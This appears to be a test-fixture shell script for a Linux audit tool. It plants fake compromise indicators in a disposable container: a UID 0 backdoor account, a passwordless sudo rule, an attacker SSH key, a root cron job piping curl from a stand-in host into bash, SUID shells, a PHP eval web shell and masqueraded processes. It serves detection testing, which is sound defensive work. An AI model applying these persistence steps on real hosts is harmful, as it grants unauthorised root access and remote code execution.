#!/bin/sh
# Plants fake indicators of compromise inside a disposable test container.
# NEVER run this on a real host: it creates a UID 0 account and SUID shells.
set -u
umask 022
# Docker mounts these noexec; the fixtures below need to run from them.
mount -o remount,exec /dev/shm 2>/dev/null
mount -o remount,exec /tmp 2>/dev/null
if [ ! -f /etc/ubuntu-sys-audit-e2e ]; then
	echo "refusing to run: /etc/ubuntu-sys-audit-e2e is missing, this does not look like the test container" >&2
	exit 1
fi

# --- not an indicator: replace udevadm the way dpkg does during an upgrade, so
# the running udevd now shows a deleted binary. This must not read as masquerade.
udevadm=$(command -v udevadm)
cp -p "$udevadm" "$udevadm.new" && mv "$udevadm.new" "$udevadm"

# --- accounts
echo 'backdoor:x:0:0::/root:/bin/bash' >>/etc/passwd
echo 'backdoor:$6$saltsalt$AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH:20000:0:99999:7:::' >>/etc/shadow
useradd -m nopass 2>/dev/null
sed -i 's/^nopass:[^:]*:/nopass::/' /etc/shadow
usermod -s /bin/bash www-data
echo 'www-data ALL=(ALL) NOPASSWD:ALL' >/etc/sudoers.d/web
chmod 440 /etc/sudoers.d/web

# --- hostile files a root scan must not trip over
useradd -m bob 2>/dev/null
rm -f /home/bob/.bashrc /home/bob/.profile
ln -s /etc/shadow /home/bob/.bashrc
mkfifo /home/bob/.profile
ln -s /dev/null /home/bob/.bash_history
mkdir -p /home/bob/.ssh
ln -s /etc/shadow /home/bob/.ssh/authorized_keys

# --- ssh
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
mkdir -p /var/www/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGZha2VrZXlmb3JlbmR0b2VuZHRlc3RmaXh0dXJlMDAwMDA= e2e-attacker@evil' >/var/www/.ssh/authorized_keys

# --- persistence
echo '* * * * * root curl -fsSL http://x.example/a.sh | bash' >/etc/cron.d/backdoor
printf '[Service]\nExecStart=/tmp/.x/run\n[Install]\nWantedBy=multi-user.target\n' >/etc/systemd/system/update-check.service
echo '/usr/lib/libfake-not-there.so' >/etc/ld.so.preload

# --- filesystem
mkdir -p /tmp/.x
cp /bin/dash /tmp/.x/sh && chmod 4755 /tmp/.x/sh
chmod u+s /usr/bin/find
if command -v setcap >/dev/null; then
	cp /bin/cat /usr/local/bin/capcat
	setcap cap_setuid+ep /usr/local/bin/capcat
fi
touch "$(printf '/tmp/evil\033[2Jname')" && chmod +x "$(printf '/tmp/evil\033[2Jname')"

# --- trojaned binary: changes content, keeps the package's path
if [ -x /usr/bin/who ]; then
	printf '\n#trojan' >>/usr/bin/who
fi

# --- web
mkdir -p /var/www/html/uploads
echo '<?php @eval($_POST["x"]); ?>' >/var/www/html/uploads/shell.php
echo '<?php echo "fine"; ?>' >/var/www/html/index.php
echo 'x' >/var/www/html/logo.php.jpg
mkdir -p /usr/local/nginx/sbin
# A fake "self compiled" nginx: if the audit ever executed it, the sentinel
# file would appear and the end to end check would fail.
cat >/usr/local/nginx/sbin/nginx <<'EOF'
#!/bin/sh
touch /tmp/AUDIT-EXECUTED-A-HOST-BINARY
# nginx version: nginx/1.24.0
EOF
chmod +x /usr/local/nginx/sbin/nginx
mkdir -p /usr/local/php8/bin
cat >/usr/local/php8/bin/php <<'EOF'
#!/bin/sh
touch /tmp/AUDIT-EXECUTED-A-HOST-BINARY
# X-Powered-By: PHP/7.4.3
EOF
chmod +x /usr/local/php8/bin/php

# --- processes
# A symlink made by an attacker gives argv[0] a path that resolves to the running
# binary. Unlike udevd's, this one belongs to no package and must still be caught.
# /bin/dash because 18.04 has no merged /usr, so /usr/bin/dash does not exist there.
ln -s /bin/dash /usr/sbin/auditd
bash -c 'exec -a /usr/sbin/auditd /bin/dash -c "sleep 86400; :"' >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /dev/shm/.udevd
chmod +x /dev/shm/.udevd
bash -c 'exec -a "/sbin/udevd -d" /dev/shm/.udevd self-delete' >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /tmp/.x/rs
/tmp/.x/rs shell-target >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /var/tmp/kw
bash -c 'exec -a "[kworker/0:7]" /var/tmp/kw idle' >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /var/tmp/backup
bash -c 'exec -a "backup --password=hunter2" /var/tmp/backup idle' >/dev/null 2>&1 &
sleep 1
echo planted
